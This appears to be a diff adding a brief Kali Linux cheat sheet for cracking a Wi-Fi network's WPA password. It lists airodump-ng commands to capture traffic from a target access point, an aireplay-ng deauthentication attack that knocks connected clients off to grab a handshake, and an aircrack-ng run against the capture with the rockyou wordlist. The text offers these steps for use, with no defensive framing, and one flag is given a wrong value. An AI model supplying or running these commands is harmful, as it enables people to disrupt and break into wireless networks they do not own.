@@ -1,0 +1,23 @@
+code for kali:
+
+terminal 1:
+
+sudo su
+
+iwconfig
+
+airodump-ng (adapter)
+
+airodump-ng --bssid (bssid) --channel (num-channel) --write hack (adapter)
+
+terminal 2:
+
+sudo su
+
+aireplay-ng --deauth 20 -a (bssid) -e (station-from-terminal1) (adapter)
+
+terminal 1:
+
+ls [cari .cap]
+
+aircrack-ng (file.cap) -w /usr/share/wordlist/rockyou.txt
